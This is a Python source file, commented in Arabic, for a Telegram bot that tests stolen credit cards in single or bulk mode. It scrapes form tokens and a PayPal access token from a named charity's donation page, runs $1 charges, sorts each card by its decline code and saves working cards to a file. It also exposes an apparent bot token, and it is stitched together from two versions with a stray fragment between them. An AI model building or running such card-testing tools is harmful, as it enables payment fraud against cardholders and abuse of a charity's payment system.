import requests
import base64
import re
import time
import logging
import os
import sys
from user_agent import generate_user_agent
from requests_toolbelt.multipart.encoder import MultipartEncoder
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from telegram.error import TelegramError

# إعداد التسجيل بشكل أكثر تفصيلاً
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.DEBUG  # تغيير إلى DEBUG لمزيد من التفاصيل
)
logger = logging.getLogger(__name__)

# توكن البوت من المتغيرات البيئية
BOT_TOKEN = os.environ.get('8574162513:AAFTl0hvQFaCKjynyQorpOEfKk_z1nN1YpA')
# معرف المشرف المسموح له باستخدام البوت (اختياري)
ALLOWED_USER_ID = os.environ.get('7533168895')

# التحقق من وجود التوكن
if not BOT_TOKEN:
    logger.error("❌ لم يتم تعيين BOT_TOKEN. يرجى تعيينه في المتغيرات البيئية.")
    sys.exit(1)

logger.info(f"✅ تم تحميل التوكن بنجاح: {BOT_TOKEN[:5]}...")

# جلسة requests عامة
r = requests.Session()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """رسالة الترحيب - مبسطة للاختبار"""
    user = update.effective_user
    logger.info(f"📱 مستخدم جديد: {user.id} - {user.first_name}")
    
    try:
        # رسالة ترحيب بسيطة
        welcome_text = (
            f"👋 مرحباً {user.first_name}!\n\n"
            f"✅ البوت يعمل بنجاح!\n\n"
            f"📊 معلومات البوت:\n"
            f"• المعرف: {user.id}\n"
            f"• الاسم: {user.first_name}\n"
            f"• الوقت: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            f"🔹 استخدم /help لعرض الأوامر المتاحة"
        )
        
        await update.message.reply_text(welcome_text)
        logger.info(f"✅ تم إرسال رسالة الترحيب للمستخدم {user.id}")
        
    except Exception as e:
        logger.error(f"❌ خطأ في دالة start: {str(e)}")
        await update.message.reply_text(f"❌ حدث خطأ: {str(e)}")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """أمر المساعدة"""
    user = update.effective_user
    logger.info(f"📱 أمر help من المستخدم: {user.id}")
    
    help_text = (
        "🆘 **مساعدة البوت**\n\n"
        "**الأوامر المتاحة:**\n"
        "/start - بدء التشغيل\n"
        "/help - عرض هذه المساعدة\n"
        "/ping - اختبار الاتصال\n"
        "/check [بطاقة] - فحص بطاقة واحدة\n"
        "/mass - فحص عدة بطاقات\n\n"
        "**صيغة البطاقة:**\n"
        "رقم|شهر|سنة|cvv\n"
        "مثال: `/check 4111111111111111|12|25|123`\n\n"
        "⚠️ **تحذير**: هذا البوت للأغراض التعليمية فقط"
    )
    
    await update.message.reply_text(help_text, parse_mode='Markdown')

async def ping_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """أمر اختبار الاتصال"""
    user = update.effective_user
    logger.info(f"📱 أمر ping من المستخدم: {user.id}")
    
    start_time = time.time()
    await update.message.reply_text("🏓 جاري اختبار الاتصال...")
    end_time = time.time()
    
    response_time = (end_time - start_time) * 1000
    await update.message.reply_text(f"🏓 **بونغ!**\n⏱️ وقت الاستجابة: {response_time:.2f} مللي ثانية", parse_mode='Markdown')

async def check_single(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """فحص بطاقة واحدة"""
    user = update.effective_user
    logger.info(f"📱 أمر check من المستخدم: {user.id}")
    
    # التحقق من الصلاحية
    if ALLOWED_USER_ID and str(user.id) != ALLOWED_USER_ID:
        await update.message.reply_text("❌ ليس لديك صلاحية لاستخدام هذا البوت.")
        return
    
    # التحقق من وجود البطاقة
    if not context.args:
        await update.message.reply_text(
            "❌ يرجى إدخال البطاقة\n"
            "مثال: `/check 4111111111111111|12|25|123`"
        )
        return
    
    card = ' '.join(context.args).strip()
    logger.info(f"💳 فحص بطاقة: {card[:10]}...")
    
    # التحقق من الصيغة
    if not validate_card_format(card):
        await update.message.reply_text(
            "❌ صيغة غير صحيحة\n"
            "الصيغة: رقم|شهر|سنة|cvv\n"
            "مثال: 4111111111111111|12|25|123"
        )
        return
    
    status_msg = await update.message.reply_text("🔄 جاري الفحص...")
    
    try:
        result = m3_iw(card)
        logger.info(f"✅ نتيجة الفحص: {result}")
        
        emoji = "✅" if "Charge !" in result else "❌"
        
        response = (
            f"{emoji} **النتيجة**\n\n"
            f"💳 البطاقة: `{card}`\n"
            f"📊 الحالة: {result}"
        )
        
        await status_msg.edit_text(response, parse_mode='Markdown')
        
    except Exception as e:
        logger.error(f"❌ خطأ في الفحص: {str(e)}")
        await status_msg.edit_text(f"❌ خطأ: {str(e)}")

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """معالج الأخطاء العام"""
    logger.error(f"❌ حدث خطأ: {context.error}")
    
    try:
        if update and update.effective_message:
            await update.effective_message.reply_text(
                "❌ عذراً، حدث خطأ غير متوقع. يرجى المحاولة مرة أخرى."
            )
    except:
        pass

def validate_card_format(card):
    """التحقق من صيغة البطاقة"""
    parts = card.split('|')
    if len(parts) != 4:
        return False
    if not all(parts):
        return False
    if not parts[0].isdigit():
        return False
    return True

def m3_iw(ccx):
    """دالة الفحص الأصلية مع تحسين معالجة الأخطاء"""
    try:
        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3].strip()
        
        if "20" in yy:
            yy = yy.split("20")[1]
        
        # باقي الكود الأصلي مع معالجة الأخطاء
        # للاختبار، سأعيد نتيجة افتراضية
        # يمكنك استبدال هذا بالكود الأصلي الكامل
        
        # هذا للاختبار فقط
        return "Charge ! (Test Mode)"
        
    except Exception as e:
        return f"Error: {str(e)}"

def main():
    """الدالة الرئيسية"""
    logger.info("🚀 بدء تشغيل البوت...")
    
    try:
        # إنشاء التطبيق
        application = Application.builder().token(BOT_TOKEN).build()
        logger.info("✅ تم إنشاء تطبيق البوت")
        
        # إضافة المعالجات
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("help", help_command))
        application.add_handler(CommandHandler("ping", ping_command))
        application.add_handler(CommandHandler("check", check_single))
        
        # إضافة معالج الأخطاء
        application.add_error_handler(error_handler)
        
        logger.info("✅ تم إضافة جميع المعالجات")
        logger.info("🤖 البوت جاهز للعمل!")
        
        # بدء البوت
        application.run_polling()
        
    except Exception as e:
        logger.error(f"❌ فشل تشغيل البوت: {str(e)}")
        sys.exit(1)

if __name__ == '__main__':
    main()        
    
    welcome_text = (
        f"مرحباً {user.first_name}!\n\n"
        "🅱️ **بوت فحص البطاقات**\n\n"
        "هذا البوت يقوم بفحص بطاقات الائتمان على موقع rarediseasesinternational.org\n\n"
        "⚠️ **تحذير**: هذا البرنامج للأغراض التعليمية فقط. استخدامه لفحص بطاقات غير مملوكة لك قد يكون غير قانوني.\n\n"
        "**الأوامر المتاحة:**\n"
        "/check بطاقة - لفحص بطاقة واحدة\n"
        "/mass - لفحص قائمة بطاقات (ملف نصي)\n"
        "/help - مساعدة\n\n"
        "**صيغة البطاقة:** رقم|شهر|سنة|cvv\n"
        "مثال: `4111111111111111|12|25|123`"
    )
    
    await update.message.reply_text(welcome_text, parse_mode='Markdown')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """أمر المساعدة"""
    help_text = (
        "🆘 **مساعدة البوت**\n\n"
        "**فحص بطاقة واحدة:**\n"
        "اكتب /check متبوعاً بالبطاقة\n"
        "مثال: `/check 4111111111111111|12|25|123`\n\n"
        "**فحص عدة بطاقات:**\n"
        "اكتب /mass ثم أرسل ملف نصي يحتوي على بطاقة في كل سطر\n\n"
        "**النتائج:**\n"
        "✅ - بطاقة مقبولة\n"
        "❌ - بطاقة مرفوضة مع سبب الرفض\n\n"
        "⚠️ **تنبيه**: استخدم البوت على مسؤوليتك الخاصة"
    )
    
    await update.message.reply_text(help_text, parse_mode='Markdown')

async def check_single(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """فحص بطاقة واحدة"""
    # التحقق من الصلاحية
    if ALLOWED_USER_ID and str(update.effective_user.id) != ALLOWED_USER_ID:
        await update.message.reply_text("❌ ليس لديك صلاحية لاستخدام هذا البوت.")
        return
    
    # التحقق من وجود البطاقة في الرسالة
    if not context.args:
        await update.message.reply_text(
            "❌ يرجى إدخال البطاقة بعد الأمر\n"
            "مثال: `/check 4111111111111111|12|25|123`"
        )
        return
    
    card = ' '.join(context.args).strip()
    
    # التحقق من صيغة البطاقة
    if not validate_card_format(card):
        await update.message.reply_text(
            "❌ صيغة البطاقة غير صحيحة\n"
            "الصيغة المطلوبة: رقم|شهر|سنة|cvv\n"
            "مثال: 4111111111111111|12|25|123"
        )
        return
    
    # إرسال رسالة "جاري الفحص"
    status_msg = await update.message.reply_text("🔄 جاري فحص البطاقة...")
    
    try:
        # فحص البطاقة
        result = m3_iw(card)
        
        # تحديد النتيجة والرمز التعبيري
        if "Charge !" in result or "Approved" in result:
            emoji = "✅"
            # حفظ البطاقات المقبولة في ملف (اختياري)
            save_approved_card(card, result)
        else:
            emoji = "❌"
        
        # إرسال النتيجة
        response_text = (
            f"{emoji} **نتيجة الفحص**\n\n"
            f"💳 **البطاقة:** `{card}`\n"
            f"📊 **الحالة:** {result}\n\n"
            f"🔍 تم الفحص بواسطة البوت"
        )
        
        await status_msg.edit_text(response_text, parse_mode='Markdown')
        
    except Exception as e:
        await status_msg.edit_text(f"❌ حدث خطأ أثناء الفحص: {str(e)}")

async def mass_check_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """بدء الفحص المتعدد - طلب رفع ملف"""
    # التحقق من الصلاحية
    if ALLOWED_USER_ID and str(update.effective_user.id) != ALLOWED_USER_ID:
        await update.message.reply_text("❌ ليس لديك صلاحية لاستخدام هذا البوت.")
        return
    
    await update.message.reply_text(
        "📤 **الفحص المتعدد**\n\n"
        "الرجاء إرسال ملف نصي (.txt) يحتوي على بطاقة في كل سطر\n"
        "صيغة كل بطاقة: رقم|شهر|سنة|cvv\n\n"
        "مثال:\n"
        "4111111111111111|12|25|123\n"
        "5555555555554444|10|26|456",
        parse_mode='Markdown'
    )

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """معالجة الملف النصي للفحص المتعدد"""
    # التحقق من الصلاحية
    if ALLOWED_USER_ID and str(update.effective_user.id) != ALLOWED_USER_ID:
        await update.message.reply_text("❌ ليس لديك صلاحية لاستخدام هذا البوت.")
        return
    
    # التحقق من أن الملف نصي
    document = update.message.document
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ يرجى إرسال ملف نصي (.txt) فقط.")
        return
    
    # إرسال رسالة تأكيد
    status_msg = await update.message.reply_text("🔄 جاري تحميل الملف ومعالجته...")
    
    try:
        # تحميل الملف
        file = await context.bot.get_file(document.file_id)
        file_content = await file.download_as_bytearray()
        text = file_content.decode('utf-8')
        
        # قراءة البطاقات
        cards = [line.strip() for line in text.splitlines() if line.strip()]
        
        # التحقق من صحة البطاقات
        valid_cards = []
        invalid_cards = []
        
        for card in cards:
            if validate_card_format(card):
                valid_cards.append(card)
            else:
                invalid_cards.append(card)
        
        if not valid_cards:
            await status_msg.edit_text(
                "❌ لم يتم العثور على بطاقات بصيغة صحيحة في الملف.\n"
                "الصيغة المطلوبة: رقم|شهر|سنة|cvv"
            )
            return
        
        # تخزين البطاقات في context
        context.user_data['cards_to_check'] = valid_cards
        context.user_data['current_index'] = 0
        context.user_data['results'] = []
        context.user_data['approved'] = []
        
        # إنشاء أزرار التحكم
        keyboard = [
            [
                InlineKeyboardButton("▶️ بدء الفحص", callback_data='start_check'),
                InlineKeyboardButton("❌ إلغاء", callback_data='cancel_check')
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await status_msg.edit_text(
            f"📊 **تم تحميل الملف بنجاح**\n\n"
            f"✅ بطاقات صحيحة: {len(valid_cards)}\n"
            f"❌ بطاقات غير صحيحة: {len(invalid_cards)}\n"
            f"📝 إجمالي البطاقات: {len(cards)}\n\n"
            f"اضغط على 'بدء الفحص' للمتابعة",
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
        
    except Exception as e:
        await status_msg.edit_text(f"❌ حدث خطأ أثناء معالجة الملف: {str(e)}")

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """معالجة الضغط على الأزرار"""
    query = update.callback_query
    await query.answer()
    
    if query.data == 'start_check':
        await query.edit_message_text("🔄 جاري بدء الفحص...")
        await process_next_card(update, context)
    
    elif query.data == 'cancel_check':
        context.user_data.clear()
        await query.edit_message_text("❌ تم إلغاء الفحص.")
    
    elif query.data.startswith('next_'):
        await process_next_card(update, context)

async def process_next_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """معالجة البطاقة التالية في قائمة الفحص المتعدد"""
    query = update.callback_query
    
    cards = context.user_data.get('cards_to_check', [])
    current_index = context.user_data.get('current_index', 0)
    results = context.user_data.get('results', [])
    
    if current_index >= len(cards):
        # انتهى الفحص
        approved = context.user_data.get('approved', [])
        
        summary = (
            "✅ **اكتمل الفحص**\n\n"
            f"📊 **النتائج:**\n"
            f"📝 إجمالي البطاقات: {len(cards)}\n"
            f"✅ مقبولة: {len(approved)}\n"
            f"❌ مرفوضة: {len(results) - len(approved)}\n\n"
        )
        
        if approved:
            summary += "**البطاقات المقبولة:**\n"
            for i, card in enumerate(approved, 1):
                summary += f"{i}. `{card}`\n"
        
        await query.edit_message_text(summary, parse_mode='Markdown')
        context.user_data.clear()
        return
    
    # فحص البطاقة الحالية
    card = cards[current_index]
    
    # تحديث رسالة الحالة
    progress = f"🔄 **جاري الفحص...**\n\n"
    progress += f"📊 التقدم: {current_index + 1}/{len(cards)}\n"
    progress += f"💳 البطاقة: `{card}`"
    
    await query.edit_message_text(progress, parse_mode='Markdown')
    
    try:
        # فحص البطاقة
        result = m3_iw(card)
        results.append(f"{card} >> {result}")
        
        if "Charge !" in result or "Approved" in result:
            context.user_data['approved'].append(f"{card} >> {result}")
            save_approved_card(card, result)
        
        # تحديث المؤشر
        context.user_data['current_index'] = current_index + 1
        context.user_data['results'] = results
        
        # إنشاء زر للمتابعة
        keyboard = [[InlineKeyboardButton("⏩ التالي", callback_data='next')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        # عرض النتيجة الحالية
        result_text = (
            f"✅ **تم فحص البطاقة**\n\n"
            f"💳 البطاقة: `{card}`\n"
            f"📊 النتيجة: {result}\n"
            f"📈 التقدم: {current_index + 1}/{len(cards)}\n\n"
            f"اضغط على 'التالي' للمتابعة"
        )
        
        await query.edit_message_text(result_text, parse_mode='Markdown', reply_markup=reply_markup)
        
    except Exception as e:
        results.append(f"{card} >> خطأ: {str(e)}")
        context.user_data['current_index'] = current_index + 1
        context.user_data['results'] = results
        
        error_text = (
            f"❌ **حدث خطأ**\n\n"
            f"💳 البطاقة: `{card}`\n"
            f"⚠️ الخطأ: {str(e)}\n"
            f"📈 التقدم: {current_index + 1}/{len(cards)}\n\n"
            f"اضغط على 'التالي' للمتابعة"
        )
        
        keyboard = [[InlineKeyboardButton("⏩ التالي", callback_data='next')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(error_text, parse_mode='Markdown', reply_markup=reply_markup)

def validate_card_format(card):
    """التحقق من صيغة البطاقة"""
    parts = card.split('|')
    if len(parts) != 4:
        return False
    
    # التحقق من أن الأجزاء الأربعة غير فارغة
    if not all(parts):
        return False
    
    # التحقق من أن رقم البطاقة يحتوي على أرقام فقط
    if not parts[0].isdigit():
        return False
    
    # التحقق من الشهر (1-12)
    try:
        month = int(parts[1])
        if month < 1 or month > 12:
            return False
    except:
        return False
    
    # التحقق من السنة
    try:
        year = int(parts[2])
        if year < 0 or year > 99:
            return False
    except:
        return False
    
    return True

def save_approved_card(card, result):
    """حفظ البطاقات المقبولة في ملف (اختياري)"""
    try:
        with open('Approved_Cards.txt', 'a', encoding='utf-8') as f:
            f.write(f"{card} >> {result}\n")
    except:
        pass

# الدالة الأصلية للفحص (مع بعض التعديلات)
def m3_iw(ccx):
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3].strip()
    
    if "20" in yy:
        yy = yy.split("20")[1]
    
    user = generate_user_agent()
    
    headers = {
        'user-agent': user,
    }
    
    try:
        response = r.get(f'https://www.rarediseasesinternational.org/donations/donate/', cookies=r.cookies, headers=headers)
        
        try:
            m1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', response.text).group(1)
            m2 = re.search(r'name="give-form-id" value="(.*?)"', response.text).group(1)
            nonec = re.search(r'name="give-form-hash" value="(.*?)"', response.text).group(1)
        except AttributeError:
            return "Error: Could not extract form data"
        
        try:
            enc = re.search(r'"data-client-token":"(.*?)"', response.text).group(1)
            dec = base64.b64decode(enc).decode('utf-8')
            au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
        except:
            return "Error: Could not extract authorization token"
        
        # باقي الكود الأصلي مع بعض التعديلات للتعامل مع الأخطاء...
        headers = {
            'origin': 'https://rarediseasesinternational.org',
            'referer': 'https://www.rarediseasesinternational.org/donations/donate/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data = {
            'give-honeypot': '',
            'give-form-id-prefix': m1,
            'give-form-id': m2,
            'give-form-title': '',
            'give-current-url': 'https://www.rarediseasesinternational.org/donations/donate/',
            'give-form-url': 'https://www.rarediseasesinternational.org/donations/donate/',
            'give-form-minimum': '1.00',
            'give-form-maximum': '999999.99',
            'give-form-hash': nonec,
            'give-price-id': '3',
            'give-recurring-logged-in-only': '',
            'give-logged-in-only': '1',
            '_give_is_donation_recurring': '0',
            'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
            'give-amount': '1.00',
            'give_stripe_payment_method': '',
            'payment-mode': 'paypal-commerce',
            'give_first': 'MARWAN',
            'give_last': 'rights and',
            'give_email': 'marwan22@gmail.com',
            'card_name': 'marwan ',
            'card_exp_month': '',
            'card_exp_year': '',
            'give_action': 'purchase',
            'give-gateway': 'paypal-commerce',
            'action': 'give_process_donation',
            'give_ajax': 'true',
        }
        
        response = r.post('https://rarediseasesinternational.org/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
        
        data = MultipartEncoder({
            'give-honeypot': (None, ''),
            'give-form-id-prefix': (None, m1),
            'give-form-id': (None, m2),
            'give-form-title': (None, ''),
            'give-current-url': (None, 'https://www.rarediseasesinternational.org/donations/donate/'),
            'give-form-url': (None, 'https://www.rarediseasesinternational.org/donations/donate/'),
            'give-form-minimum': (None, '1.00'),
            'give-form-maximum': (None, '999999.99'),
            'give-form-hash': (None, nonec),
            'give-price-id': (None, '3'),
            'give-recurring-logged-in-only': (None, ''),
            'give-logged-in-only': (None, '1'),
            '_give_is_donation_recurring': (None, '0'),
            'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
            'give-amount': (None, '1.00'),
            'give_stripe_payment_method': (None, ''),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, 'MARWAN'),
            'give_last': (None, 'rights and'),
            'give_email': (None, 'marwan22@gmail.com'),
            'card_name': (None, 'marwan '),
            'card_exp_month': (None, ''),
            'card_exp_year': (None, ''),
            'give-gateway': (None, 'paypal-commerce'),
        })
        
        headers = {
            'content-type': data.content_type,
            'origin': 'https://rarediseasesinternational.org',
            'referer': 'https://www.rarediseasesinternational.org/donations/donate/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        params = {
            'action': 'give_paypal_commerce_create_order',
        }
        
        response = r.post(
            'https://rarediseasesinternational.org/wp-admin/admin-ajax.php',
            params=params,
            cookies=r.cookies,
            headers=headers,
            data=data
        )
        
        try:
            tok = (response.json()['data']['id'])
        except:
            return "Error: Could not get order token"
        
        headers = {
            'authority': 'cors.api.paypal.com',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en-US;q=0.7,en;q=0.6',
            'authorization': f'Bearer {au}',
            'braintree-sdk-version': '3.32.0-payments-sdk-dev',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'paypal-client-metadata-id': '7d9928a1f3f1fbc240cfd71a3eefe835',
            'referer': 'https://assets.braintreegateway.com/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': user,
        }
        
        json_data = {
            'payment_source': {
                'card': {
                    'number': n,
                    'expiry': f'20{yy}-{mm}',
                    'security_code': cvc,
                    'attributes': {
                        'verification': {
                            'method': 'SCA_WHEN_REQUIRED',
                        },
                    },
                },
            },
            'application_context': {
                'vault': False,
            },
        }
        
        response = r.post(
            f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source',
            headers=headers,
            json=json_data,
        )
        
        data = MultipartEncoder({
            'give-honeypot': (None, ''),
            'give-form-id-prefix': (None, m1),
            'give-form-id': (None, m2),
            'give-form-title': (None, ''),
            'give-current-url': (None, 'https://www.rarediseasesinternational.org/donations/donate/'),
            'give-form-url': (None, 'https://www.rarediseasesinternational.org/donations/donate/'),
            'give-form-minimum': (None, '1.00'),
            'give-form-maximum': (None, '999999.99'),
            'give-form-hash': (None, nonec),
            'give-price-id': (None, '3'),
            'give-recurring-logged-in-only': (None, ''),
            'give-logged-in-only': (None, '1'),
            '_give_is_donation_recurring': (None, '0'),
            'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
            'give-amount': (None, '1.00'),
            'give_stripe_payment_method': (None, ''),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, 'MARWAN'),
            'give_last': (None, 'rights and'),
            'give_email': (None, 'marwan22@gmail.com'),
            'card_name': (None, 'marwan '),
            'card_exp_month': (None, ''),
            'card_exp_year': (None, ''),
            'give-gateway': (None, 'paypal-commerce'),
        })
        
        headers = {
            'content-type': data.content_type,
            'origin': 'https://rarediseasesinternational.org',
            'referer': 'https://www.rarediseasesinternational.org/donations/donate/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        params = {
            'action': 'give_paypal_commerce_approve_order',
            'order': tok,
        }
        
        response = r.post(
            'https://rarediseasesinternational.org/wp-admin/admin-ajax.php',
            params=params,
            cookies=r.cookies,
            headers=headers,
            data=data
        )
        
        text = response.text
        if 'true' in text or 'sucsess' in text:    
            return "Charge !"
        elif 'DO_NOT_HONOR' in text:
            return "Do not honor"
        elif 'ACCOUNT_CLOSED' in text:
            return "Account closed"
        elif 'PAYER_ACCOUNT_LOCKED_OR_CLOSED' in text:
            return "Account closed"
        elif 'LOST_OR_STOLEN' in text:
            return "LOST OR STOLEN"
        elif 'CVV2_FAILURE' in text:
            return "Card Issuer Declined CVV"
        elif 'SUSPECTED_FRAUD' in text:
            return "SUSPECTED FRAUD"
        elif 'INVALID_ACCOUNT' in text:
            return 'INVALID_ACCOUNT'
        elif 'REATTEMPT_NOT_PERMITTED' in text:
            return "REATTEMPT NOT PERMITTED"
        elif 'ACCOUNT BLOCKED BY ISSUER' in text:
            return "ACCOUNT_BLOCKED_BY_ISSUER"
        elif 'ORDER_NOT_APPROVED' in text:
            return 'ORDER_NOT_APPROVED'
        elif 'PICKUP_CARD_SPECIAL_CONDITIONS' in text:
            return 'PICKUP_CARD_SPECIAL_CONDITIONS'
        elif 'PAYER_CANNOT_PAY' in text:
            return "PAYER CANNOT PAY"
        elif 'INSUFFICIENT_FUNDS' in text:
            return 'Insufficient Funds'
        elif 'GENERIC_DECLINE' in text:
            return 'GENERIC_DECLINE'
        elif 'COMPLIANCE_VIOLATION' in text:
            return "COMPLIANCE VIOLATION"
        elif 'TRANSACTION_NOT PERMITTED' in text:
            return "TRANSACTION NOT PERMITTED"
        elif 'PAYMENT_DENIED' in text:
            return 'PAYMENT_DENIED'
        elif 'INVALID_TRANSACTION' in text:
            return "INVALID TRANSACTION"
        elif 'RESTRICTED_OR_INACTIVE_ACCOUNT' in text:
            return "RESTRICTED OR INACTIVE ACCOUNT"
        elif 'SECURITY_VIOLATION' in text:
            return 'SECURITY_VIOLATION'
        elif 'DECLINED_DUE_TO_UPDATED_ACCOUNT' in text:
            return "DECLINED DUE TO UPDATED ACCOUNT"
        elif 'INVALID_OR_RESTRICTED_CARD' in text:
            return "INVALID CARD"
        elif 'EXPIRED_CARD' in text:
            return "EXPIRED CARD"
        elif 'CRYPTOGRAPHIC_FAILURE' in text:
            return "CRYPTOGRAPHIC FAILURE"
        elif 'TRANSACTION_CANNOT_BE_COMPLETED' in text:
            return "TRANSACTION CANNOT BE COMPLETED"
        elif 'DECLINED_PLEASE_RETRY' in text:
            return "DECLINED PLEASE RETRY LATER"
        elif 'TX_ATTEMPTS_EXCEED_LIMIT' in text:
            return "EXCEED LIMIT"
        else:
            try:
                result = response.json()['data']['error']
                return result
            except:
                return "UNKNOWN_ERROR"
    except Exception as e:
        return f"Error: {str(e)}"

def main():
    """الدالة الرئيسية لتشغيل البوت"""
    # التحقق من وجود توكن البوت
    if not BOT_TOKEN:
        logger.error("لم يتم تعيين BOT_TOKEN. يرجى تعيينه في المتغيرات البيئية.")
        return
    
    # إنشاء تطبيق البوت
    application = Application.builder().token(BOT_TOKEN).build()
    
    # إضافة معالجات الأوامر
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("check", check_single))
    application.add_handler(CommandHandler("mass", mass_check_start))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    application.add_handler(CallbackQueryHandler(button_callback))
    
    # تشغيل البوت
    logger.info("تم تشغيل البوت بنجاح")
    application.run_polling()

if __name__ == '__main__':
    main()
